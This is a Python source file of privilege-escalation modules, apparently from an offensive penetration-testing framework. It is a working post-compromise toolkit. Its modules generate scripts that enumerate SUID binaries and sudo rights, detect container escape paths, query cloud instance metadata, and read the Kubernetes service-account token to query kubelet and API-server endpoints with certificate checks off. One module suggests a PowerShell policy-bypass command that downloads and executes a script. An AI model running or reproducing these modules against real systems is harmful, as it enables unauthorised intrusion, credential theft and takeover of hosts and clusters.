"""Attack modules: privesc."""

from __future__ import annotations

from tools.attack_modules.base import AttackModule, ModuleContext
import json
from typing import Any

class LinuxPrivescCheck(AttackModule):
    name = "LinuxPrivescCheck"
    description = "Enumerate Linux privilege escalation vectors"
    target_services = ["ssh"]
    target_ports = [22]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Checks SUID binaries, kernel version, sudo permissions, cron jobs, and more.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import subprocess, os, sys, json
# Target: {ctx.target_ip}
results = {{}}
# SUID binaries
try:
    out = subprocess.run(["find", "/", "-perm", "-4000", "-type", "f"], capture_output=True, text=True, timeout=30, stderr=subprocess.DEVNULL)
    results["suid"] = out.stdout.strip().split("\\n")[:20]
except Exception as e:
    results["suid_error"] = str(e)
# Kernel version
results["kernel"] = os.uname().release if hasattr(os, "uname") else "unknown"
# Sudo permissions
try:
    out = subprocess.run(["sudo", "-l"], capture_output=True, text=True, timeout=10)
    results["sudo"] = out.stdout[:2000]
except Exception as e:
    results["sudo_error"] = str(e)
print(json.dumps(results))
"""

class WindowsPrivescCheck(AttackModule):
    name = "WindowsPrivescCheck"
    description = "Enumerate Windows privilege escalation vectors"
    target_services = ["ms-wbt-server", "rdp", "smb", "microsoft-ds"]
    target_ports = [3389, 445]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Checks service permissions, token privileges, unquoted paths, and patch levels.",
            "suggested_command": f"powershell -ep bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ctx.target_ip}/PowerUp.ps1'); Invoke-AllChecks\"",
        }

class SUIDEnumeration(AttackModule):
    name = "SUIDEnumeration"
    description = "Find SUID/SGID binaries for privilege escalation"
    target_services = ["ssh"]
    target_ports = [22]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Enumerates SUID/SGID binaries and checks against GTFOBins.",
            "suggested_command": f"find / -perm -4000 -o -perm -2000 -type f 2>/dev/null | xargs ls -la",
        }

class KernelExploitCheck(AttackModule):
    name = "KernelExploitCheck"
    description = "Check kernel version against known local privilege escalation exploits"
    target_services = ["ssh"]
    target_ports = [22]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        return {
            "status": "info",
            "module": self.name,
            "note": "Maps kernel version to known LPE exploits (DirtyCow, PwnKit, etc.)",
            "references": [
                "https://github.com/SecWiki/linux-kernel-exploits",
                "https://github.com/lucyoa/kernel-exploits",
            ],
        }

class ContainerBreakout(AttackModule):
    name = "ContainerBreakout"
    description = "Detect and exploit Docker/container escape vulnerabilities"
    target_services = ["docker"]
    target_ports = [2375, 2376, 10250]
    required_cves = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": "Checks for exposed Docker socket, privileged containers, and kernel exploits.",
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import os, json, sys
# Target: {ctx.target_ip}
results = {{"in_container": False, "docker_socket": False, "privileged": False, "exploits": []}}
# Check if in container
try:
    with open("/proc/1/cgroup") as _f:
        _cg = _f.read()
except OSError:
    _cg = ""
if os.path.exists("/.dockerenv") or "docker" in _cg:
    results["in_container"] = True
# Check Docker socket
if os.path.exists("/var/run/docker.sock"):
    results["docker_socket"] = True
    results["exploits"].append("docker_socket_escape")
# Check privileged mode
try:
    with open("/proc/self/status") as f:
        if "CapEff:\t0000003fffffffff" in f.read():
            results["privileged"] = True
            results["exploits"].append("privileged_container")
except Exception:
    pass
print(json.dumps(results))
"""


class CloudPrivesc(AttackModule):
    name = "CloudPrivesc"
    description = "Enumerate cloud/Kubernetes privilege-escalation vectors from inside the target: IMDS metadata, service-account tokens, exposed Docker API"
    target_services = ["docker", "k8s", "http", "https"]
    target_ports = [2375, 2376, 10250, 443, 80]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Runs ON the target after compromise (not a pivot). Queries the target's own cloud "
                "metadata service (IMDSv1/v2, GCP, Azure), reads the in-container k8s service-account "
                "token, and probes the local Docker API. Findings printed as JSON."
            ),
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import json, os, socket, sys, urllib.request
# Target: {ctx.target_ip}
# NOTE: This script runs ON the target after compromise. The 169.254.169.254
# and metadata.google.internal endpoints are the TARGET's own cloud metadata
# service (link-local, internal to the target instance), not a pivot to other
# hosts. The only outbound network connection is to {ctx.target_ip} (the owned
# target) for the exposed-Docker-API probe.
results = {{"imds_v1": None, "imds_v2": None, "gcp": None, "azure": None,
           "k8s_sa_token": False, "docker_api_exposed": False, "errors": []}}

def _fetch(url, headers=None, timeout=5):
    req = urllib.request.Request(url, headers=headers or {{}})
    with urllib.request.urlopen(req, timeout=timeout) as r:
        return r.read().decode("utf-8", "replace")

# (a) AWS IMDSv1 (link-local metadata of the TARGET instance itself)
try:
    results["imds_v1"] = _fetch("http://169.254.169.254/latest/meta-data/")[:2000]
except Exception as e:
    results["errors"].append("imds_v1: " + str(e)[:200])

# (b) AWS IMDSv2 (token-gated)
try:
    tok = urllib.request.urlopen(
        urllib.request.Request("http://169.254.169.254/latest/api/token/",
                               headers={{"X-aws-ec2-metadata-token-ttl-seconds": "21600"}}),
        timeout=5).read().decode()
    results["imds_v2"] = _fetch("http://169.254.169.254/latest/meta-data/",
                                headers={{"X-aws-ec2-metadata-token": tok}})[:2000]
except Exception as e:
    results["errors"].append("imds_v2: " + str(e)[:200])

# (c) GCP metadata (metadata.google.internal is the target's own metadata endpoint)
try:
    results["gcp"] = _fetch("http://metadata.google.internal/computeMetadata/v1/",
                            headers={{"Metadata-Flavor": "Google"}})[:2000]
except Exception as e:
    results["errors"].append("gcp: " + str(e)[:200])

# (d) Azure metadata (169.254.169.254 /metadata/instance)
try:
    results["azure"] = _fetch("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
                              headers={{"Metadata": "true"}})[:2000]
except Exception as e:
    results["errors"].append("azure: " + str(e)[:200])

# (e) k8s service-account token (mounted inside the target's container/pod)
sa_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
if os.path.exists(sa_path):
    results["k8s_sa_token"] = True

# (f) exposed Docker API on the target's loopback (probe ctx.target_ip)
for port in (2375, 2376):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(3)
        s.connect(("{ctx.target_ip}", port))
        s.sendall(b"GET /version HTTP/1.0\\r\\n\\r\\n")
        data = s.recv(512).decode("utf-8", "replace")
        s.close()
        if "Docker" in data or "ApiVersion" in data or "200" in data:
            results["docker_api_exposed"] = True
            results["docker_port"] = port
            break
    except Exception as e:
        results["errors"].append("docker_{{}}: ".format(port) + str(e)[:200])

print(json.dumps(results))
"""


class K8sPrivesc(AttackModule):
    name = "K8sPrivesc"
    description = "Probe Kubernetes API surface on the target for privilege escalation: kubelet read-only, anonymous API server, privileged pods, RBAC scope"
    target_services = ["k8s", "kubelet", "https"]
    target_ports = [6443, 10250, 8443, 443]
    required_cves: list[str] = []

    def run(self, ctx: ModuleContext) -> dict[str, Any]:
        script = self.generate_python_script(ctx)
        return {
            "status": "script_generated",
            "module": self.name,
            "script": script,
            "note": (
                "Probes the kubelet read-only API (10250), the kube-apiserver (6443) with an "
                "anonymous or captured service-account token, checks for privileged pods / hostPath "
                "mounts / permissive RBAC, and lists namespaces the token can access. Connects only "
                "to ctx.target_ip. Findings printed as JSON."
            ),
        }

    def generate_python_script(self, ctx: ModuleContext) -> str:
        return f"""import json, os, socket, ssl, sys, urllib.request
# Target: {ctx.target_ip}
# Connects ONLY to {ctx.target_ip} (the owned target). No pivoting.
results = {{"kubelet_pods": None, "kubelet_runningpods": None,
           "apiserver": None, "privileged_pods": [], "hostpath_pods": [],
           "namespaces": [], "token_source": None, "errors": []}}

TARGET = "{ctx.target_ip}"

# Read in-container service-account token if present (runs ON the target)
TOKEN = None
sa_path = "/var/run/secrets/kubernetes.io/serviceaccount/token"
if os.path.exists(sa_path):
    try:
        with open(sa_path) as _f:
            TOKEN = _f.read().strip()
        results["token_source"] = "serviceaccount"
    except Exception as e:
        results["errors"].append("sa_read: " + str(e)[:200])

def _https_get(host, port, path, token=None, timeout=5):
    ctx = ssl._create_unverified_context()
    url = "https://{{}}:{{}}{{}}".format(host, port, path)
    headers = {{}}
    if token:
        headers["Authorization"] = "Bearer " + token
    req = urllib.request.Request(url, headers=headers)
    with urllib.request.urlopen(req, timeout=timeout, context=ctx) as r:
        return r.read().decode("utf-8", "replace")

# (a) kubelet read-only API on 10250: /pods and /runningpods/
for path, key in (("/pods", "kubelet_pods"), ("/runningpods/", "kubelet_runningpods")):
    try:
        results[key] = _https_get(TARGET, 10250, path, token=TOKEN)[:4000]
    except Exception as e:
        results["errors"].append("kubelet{{}}: ".format(path) + str(e)[:200])

# (b) kube-apiserver on 6443 with anonymous token, falling back to SA token
auth_token = TOKEN  # use SA token if available; else anonymous (anonymous auth misconfig)
try:
    results["apiserver"] = _https_get(TARGET, 6443, "/api/v1/pods", token=auth_token)[:6000]
except Exception as e:
    results["errors"].append("apiserver: " + str(e)[:200])

# (c) check for privileged pods / hostPath mounts from the pod list
import json as _json
pods_blob = results.get("apiserver") or results.get("kubelet_pods") or ""
try:
    pods = _json.loads(pods_blob)
    items = pods.get("items", []) if isinstance(pods, dict) else []
    for pod in items:
        spec = pod.get("spec", {{}})
        meta = pod.get("metadata", {{}})
        pname = meta.get("name", "?")
        ns = meta.get("namespace", "?")
        if spec.get("containers"):
            for c in spec["containers"]:
                if c.get("securityContext", {{}}).get("privileged"):
                    results["privileged_pods"].append("{{}}/{{}}".format(ns, pname))
                for mnt in c.get("volumeMounts", []):
                    if mnt.get("mountPath", "").startswith("/host") or mnt.get("mountPath") == "/":
                        results["hostpath_pods"].append("{{}}/{{}}:{{}}".format(ns, pname, mnt.get("mountPath")))
except Exception as e:
    results["errors"].append("pod_parse: " + str(e)[:200])

# (d) list namespaces the token can access
try:
    ns_blob = _https_get(TARGET, 6443, "/api/v1/namespaces", token=auth_token)[:4000]
    ns_obj = _json.loads(ns_blob)
    if isinstance(ns_obj, dict):
        results["namespaces"] = [i.get("metadata", {{}}).get("name", "?") for i in ns_obj.get("items", [])]
except Exception as e:
    results["errors"].append("namespaces: " + str(e)[:200])

print(json.dumps(results))
"""


# ---------------------------------------------------------------------------
# Network Service Modules
# ---------------------------------------------------------------------------

